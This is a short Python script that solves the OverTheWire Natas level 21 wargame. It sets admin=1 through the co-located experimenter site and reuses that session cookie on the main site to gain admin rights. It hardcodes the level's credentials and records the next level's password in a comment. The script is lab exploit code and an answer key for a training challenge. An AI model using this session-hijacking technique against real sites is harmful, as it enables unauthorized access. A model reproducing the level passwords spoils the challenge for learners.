import requests

url1 = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=True'
url2 = 'http://natas21.natas.labs.overthewire.org/?debug=True'
username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

session = requests.session()

response = session.post(
    url1, data={
        "admin": "1",
        "submit": "Update"
    }, auth=(username, password))

sess_cookie = session.cookies['PHPSESSID']

response = session.get(url2, cookies={"PHPSESSID": sess_cookie}, auth=(username, password))
print(response.text)

# natas22_pass: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ